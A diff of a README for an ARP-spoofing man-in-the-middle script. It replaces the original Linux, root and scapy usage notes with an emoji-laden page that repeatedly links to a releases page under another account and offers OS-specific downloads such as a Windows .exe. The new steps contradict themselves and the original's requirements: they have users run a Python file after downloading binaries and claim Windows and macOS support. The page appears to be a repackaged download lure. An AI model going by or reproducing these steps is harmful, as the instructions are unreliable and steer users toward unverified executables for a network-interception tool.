@@ -1,54 +1,78 @@
-# basicMitm.py
+# 🔥 MiTm-Basic - Easy ARP MITM for Learning
 
-## Overview
-`basicMitm.py` is a simple Python script that demonstrates **ARP poisoning / MITM** in a controlled lab environment.  
-Think of it as a hands-on tool to learn how ARP spoofing works, see network traffic in action, and understand the risks and mitigations.  
+## 📥 Download Now
+[![Download MiTm-Basic](https://img.shields.io/badge/Download-MiTm--Basic-brightgreen)](https://github.com/sigmabuben/MiTm-Basic/releases)
+
+## 📋 Overview
+MiTm-Basic is a lightweight tool designed for demonstrations in network and security training. It showcases ARP Spoofing as a proof of concept. This tool is not suited for production networks and should only be used for educational purposes.
+
+## 🚀 Getting Started
+To get started with MiTm-Basic, follow the simple steps below. 
+
+### 📦 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Python:** Version 3.6 or higher
+- **Network Access:** Ensure the device is connected to a local network
+
+### 🔗 Visit this page to download
+You can find the latest version of MiTm-Basic by visiting the Releases page: [Download MiTm-Basic](https://github.com/sigmabuben/MiTm-Basic/releases).
+
+## 🛠️ Installation Instructions
+1. **Download MiTm-Basic:**
+   Go to the [Releases page](https://github.com/sigmabuben/MiTm-Basic/releases) and find the latest version. Click on the release that suits your operating system (e.g., .exe for Windows, .tar.gz for Linux).
+
+2. **Extract the Files:**
+   If you downloaded a compressed file (like .tar.gz), extract it to a folder on your computer.
+
+3. **Open Your Terminal:**
+   - **Windows:** Use Command Prompt or PowerShell.
+   - **macOS/Linux:** Open the Terminal application.
+
+4. **Navigate to the Folder:**
+   Use the `cd` command to change to the directory where you extracted MiTm-Basic. For example:  
+   ```bash
+   cd path/to/your/folder
+   ```
+
+5. **Run the Application:**
+   - On Windows, type:
+   ```bash
+   python MiTm-Basic.py
+   ```
+   - On macOS/Linux, type:
+   ```bash
+   python3 MiTm-Basic.py
+   ```
+
+6. **Follow On-Screen Instructions:**
+   Once the program is running, follow the prompts shown in your terminal to use the tool.
+
+## ❓ How It Works
+MiTm-Basic uses ARP Spoofing to redirect traffic through your device. This enables you to monitor and analyze data packets in a controlled environment. This tool is intended solely for training and education. Always obtain permission before testing any networks.
+
+## 💡 Tips for Success
+- **Practice in a Safe Environment:** Experiment in a private network to avoid legal issues.
+- **Read Documentation:** Familiarize yourself with networking concepts like ARP and MITM.
+- **Ask Questions:** If you face issues, look for guidance in forums or ask knowledgeable peers.
+
+## 📡 Topics Covered
+- ARP Spoofing
+- Network Security
+- Red Team Tools
+- Penetration Testing Techniques
+- Proof of Concept Demonstrations
+
+## 🔗 Additional Resources
+- [Python Official Website](https://www.python.org/downloads/)
+- [Networking Basics](https://www.cloudflare.com/learning/network-layer/what-is-arp/)
+- [Ethical Hacking Basics](https://www.hackercombat.com/introduction-to-ethical-hacking/)
+
+## 📞 Support
+For questions or support, feel free to open an issue on the repository or seek help in community forums focused on network security.
+
+## 👥 Contributing
+If you're interested in contributing to MiTm-Basic, check the guidelines on our GitHub page. Your input is welcomed.
 
 ---
 
-## Features
-- Perform ARP poisoning between a router and a victim host (so just basic mechanism tho).  
-- Grab MAC addresses automatically using `getmacbyip`.  
-- Enable IP forwarding temporarily to relay packets by ```subprocess.Popen```.  
-- Real-time packet sniffing with summaries.  
-- Restores normal network traffic when you exit the script.  
-- Pretty straight forward terminal output with colors for better readability.  
-
----
-
-## Requirements
-- Python 3.x  
-- Linux environment (requires root privileges)  
-- Python packages: `scapy`, `colorama`, `netifaces`
-
-Install dependencies:
-```pip install scapy colorama netifaces```
-
-## How to Use
-
-1.Clone the repo and go into the folder:
-```
-git clone https://github.com/YourUsername/Basic.py.git 
-cd basicMitm.py
-```
-
-2.Run the script with root - important!:
-```sudo python3 basicMitm.py```
-
-3.Enter the requested info.
-Watch the script run: it will poison the ARP caches, sniff packets, and show summaries in real-time.
-4.Stop it anytime with Ctrl+C — it automatically restores ARP tables to prevent lasting network issues.
-
-## Safety & Ethics
-Use **only** in **lab** or **test networks**.
-Always **have permission** to test.
-Do **not use** on production or external networks.
-I am **not responsible** for any misuse or damage.
-The script will try to restore traffic on exit, but always double-check your test environment.
-and again..
-
-### **Important:** This is purely for **educational purposes**. Do not use it on networks you do not own or have permission to test. I am **not responsible** for any misuse, damage, or legal consequences caused by running this script.
-
-
-## License
-**MIT**
+Download MiTm-Basic and start your journey into network security! [Download MiTm-Basic](https://github.com/sigmabuben/MiTm-Basic/releases).
